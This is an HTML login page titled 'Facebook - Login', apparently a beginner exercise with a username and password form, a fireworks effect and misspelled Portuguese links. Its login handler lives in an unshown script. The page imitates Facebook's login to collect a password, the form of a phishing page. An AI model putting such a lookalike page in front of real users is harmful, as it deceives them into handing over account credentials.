<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Login</title>
    <script src="js/index.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/fireworks-js@2.x/dist/index.umd.js"></script>
    <link rel="stylesheet" href="css/index.css"/>
</head>
<body>
    <div class="container">
        <div class="box">
            <h3>Facebook</h3>
            <hr>
            <div id="response">

            </div>
            <div id="fireworks"></div>
            <h5>Login</h5>
            <form>
                <div style="text-align: center">
                    <input type="email" id="id_usuario" value="" name="username" placeholder="Username" value="">
                    <input type="password" id="id_senha" name="password" placeholder="Password" value="">
                    <input id="submit_id" type="button" value="Login" onclick="onLogin()">
                </div>
                 <div>
                    <a href="#">Esqueci a senha</a>
                    <a href="#">Sou novoa</a>
                </div>
            </form>
        </div>
    </div>
    <img src="imageas.jpeg" alt="">
</body>
</html>
